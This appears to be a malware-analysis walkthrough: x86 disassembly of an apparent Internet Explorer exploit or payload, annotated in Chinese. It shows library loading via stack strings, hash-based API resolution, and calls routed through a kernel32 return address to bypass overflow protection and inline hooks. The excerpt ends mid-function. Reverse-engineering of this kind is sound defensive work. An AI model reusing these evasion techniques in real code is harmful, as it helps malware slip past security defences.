
### 00407213
```
00407213    68 49454672     push    72464549
00407218    8BF4            mov     esi, esp                           ; "IEFrame"
0040721A    B9 08000000     mov     ecx, 8
0040721F    F3:A6           repe    cmps byte ptr es:[edi], byte ptr [esi]
00407221    75 2F           jnz     short 00407252                             ; 判断窗口类名是否为 IE 的类名"IEFrame"，否则跳走不做操作
00407223    6A 00           push    0
00407225    3E:FF7424 20    push    dword ptr ds:[esp+20]
0040722A    E8 24020000     call    <Get_GetWindowThreadProcessId>
0040722F    FFD0            call    eax
00407231    8BF8            mov     edi, eax
00407233    E8 CB010000     call    <Get_GetCurrentThreadId>
00407238    FFD0            call    eax
0040723A    3BF8            cmp     edi, eax
0040723C    74 08           je      short 00407246                             ; 窗口所属线程与自身线程一致则跳
0040723E    36:8B4424 20    mov     eax, dword ptr [esp+20]
00407243    3E:FF00         inc     dword ptr [eax]
00407246    3E:FF7424 1C    push    dword ptr ds:[esp+1C]
0040724B    E8 EF010000     call    <Get_DestroyWindow>
00407250    FFD0            call    eax
00407252    83C4 10         add     esp, 10
00407255    5F              pop     edi
00407256    5E              pop     esi
00407257    B8 01000000     mov     eax, 1
0040725C    C3              retn
```

## `Geturlmon`

; 得到 urlmon.dll 的基址。调用 `LoadLibraryA` 时尝试绕过防溢出检测和 INLINE HOOK。

```
0040725D >  68 6F6E0000     push    6E6F
00407262    68 75726C6D     push    6D6C7275
00407267    EB 15           jmp     short 0040727E
00407269    8D4424 04       lea     eax, dword ptr [esp+4]
0040726D    50              push    eax
0040726E    E8 22FEFFFF     call    <FindRetCodeInkernel32>
00407273    50              push    eax
00407274    E8 4A020000     call    <Get_LoadLibraryA>
00407279  ^ E9 E2FEFFFF     jmp     <CallPassingInlineHook>
0040727E    E8 E6FFFFFF     call    00407269
00407283    83C4 08         add     esp, 8
00407286    C3              retn
```

## `Getntdll`

; 得到 ntdll.dll 的基址，与 `Geturlmon` 相类似……

```
00407287 >  6A 6C           push    6C
00407289    68 6E74646C     push    6C64746E
0040728E    EB 15           jmp     short 004072A5
00407290    8D4424 04       lea     eax, dword ptr [esp+4]
00407294    50              push    eax
00407295    E8 FBFDFFFF     call    <FindRetCodeInkernel32>
0040729A    50              push    eax
0040729B    E8 23020000     call    <Get_LoadLibraryA>
004072A0  ^ E9 BBFEFFFF     jmp     <CallPassingInlineHook>
004072A5    E8 E6FFFFFF     call    00407290
004072AA    83C4 08         add     esp, 8
004072AD    C3              retn
```

## `GetUser32`

```
004072AE >  68 33320000     push    3233
004072B3    68 75736572     push    72657375
004072B8    EB 15           jmp     short 004072CF
004072BA    8D4424 04       lea     eax, dword ptr [esp+4]
004072BE    50              push    eax
004072BF    E8 D1FDFFFF     call    <FindRetCodeInkernel32>
004072C4    50              push    eax
004072C5    E8 F9010000     call    <Get_LoadLibraryA>
004072CA  ^ E9 91FEFFFF     jmp     <CallPassingInlineHook>
004072CF    E8 E6FFFFFF     call    004072BA
004072D4    83C4 08         add     esp, 8
004072D7    C3              retn
```

## `Getshdocvw`

```
004072D8 >  68 63767700     push    777663
004072DD    68 7368646F     push    6F646873
004072E2    EB 15           jmp     short 004072F9
004072E4    8D4424 04       lea     eax, dword ptr [esp+4]
004072E8    50              push    eax
004072E9    E8 A7FDFFFF     call    <FindRetCodeInkernel32>
004072EE    50              push    eax
004072EF    E8 CF010000     call    <Get_LoadLibraryA>
004072F4  ^ E9 67FEFFFF     jmp     <CallPassingInlineHook>
004072F9    E8 E6FFFFFF     call    004072E4
004072FE    83C4 08         add     esp, 8
00407301    C3              retn
```

## `Getvgx`

; 这个函数似乎没有被调用到，"vgx"也是我直接从字符串中找出来，本身是否有 bug 存疑。

```
00407302 >  68 76677800     push    786776
00407307    EB 15           jmp     short 0040731E
00407309    8D4424 04       lea     eax, dword ptr [esp+4]
0040730D    50              push    eax
0040730E    E8 82FDFFFF     call    <FindRetCodeInkernel32>
00407313    50              push    eax
00407314    E8 AA010000     call    <Get_LoadLibraryA>
00407319  ^ E9 42FEFFFF     jmp     <CallPassingInlineHook>
0040731E    E8 E6FFFFFF     call    00407309
00407323    83C4 04         add     esp, 4
00407326    C3              retn
```

## `Get_VirtualProtect`

; 得到 VirtualProtect 地址，方法是得到 kernel32.dll 基址后再遍历输出表。

```
00407327 >  E8 AB010000     call    <Getkernel32>
0040732C    68 1BC64679     push    7946C61B
00407331    50              push    eax
00407332    E8 C6010000     call    <GetAPIFromExport>
00407337    83C4 08         add     esp, 8
0040733A    C3              retn
```

## `Get_GlobalAlloc`

```
0040733B >  E8 97010000     call    <Getkernel32>
00407340    68 EC97030C     push    0C0397EC
00407345    50              push    eax
00407346    E8 B2010000     call    <GetAPIFromExport>
0040734B    83C4 08         add     esp, 8
0040734E    C3              retn
```

## `Get_GetProcAddress`

```
0040734F >  E8 83010000     call    <Getkernel32>
00407354    68 AAFC0D7C     push    7C0DFCAA
00407359    50              push    eax
0040735A    E8 9E010000     call    <GetAPIFromExport>
0040735F    83C4 08         add     esp, 8
00407362    C3              retn
```

## `Get_UnhandledExceptionFilter`

```
00407363 >  E8 6F010000     call    <Getkernel32>
00407368    68 ED56EF36     push    36EF56ED
0040736D    50              push    eax
0040736E    E8 8A010000     call    <GetAPIFromExport>
00407373    83C4 08         add     esp, 8
00407376    C3              retn
```

## `Get_SetUnhandledExceptionFilter`

```
00407377 >  E8 5B010000     call    <Getkernel32>
0040737C    68 F08A045F     push    5F048AF0
00407381    50              push    eax
00407382    E8 76010000     call    <GetAPIFromExport>
00407387    83C4 08         add     esp, 8
0040738A    C3              retn
```

## `Get_RtlAddVectoredExceptionHandler`

```
0040738B >  E8 F7FEFFFF     call    <Getntdll>
00407390    68 7868DB1C     push    1CDB6878
00407395    50              push    eax
00407396    E8 62010000     call    <GetAPIFromExport>
0040739B    83C4 08         add     esp, 8
0040739E    C3              retn
```

## `Get_ExitThread`

```
0040739F >  E8 33010000     call    <Getkernel32>
004073A4    68 EFCEE060     push    60E0CEEF
004073A9    50              push    eax
004073AA    E8 4E010000     call    <GetAPIFromExport>
004073AF    83C4 08         add     esp, 8
004073B2    C3              retn
```

## `Get_Sleep`

```
004073B3 >  E8 1F010000     call    <Getkernel32>
004073B8    68 B0492DDB     push    DB2D49B0
004073BD    50              push    eax
004073BE    E8 3A010000     call    <GetAPIFromExport>
004073C3    83C4 08         add     esp, 8
004073C6    C3              retn
```

## `Get_Unknown`

; 这个函数没有被调用到。由于 `Getvgx` 调用失败，所以我不知道这里得到的是什么函数地址，只能 Unknown 了……

```
004073C7 >  E8 36FFFFFF     call    <Getvgx>
004073CC    68 AB5E9B1E     push    1E9B5EAB
004073D1    50              push    eax
004073D2    E8 26010000     call    <GetAPIFromExport>
004073D7    83C4 08         add     esp, 8
004073DA    C3              retn
```

## `Get_LdrShutdownThread`

```
004073DB >  E8 A7FEFFFF     call    <Getntdll>
004073E0    68 59978102     push    2819759
004073E5    50              push    eax
```
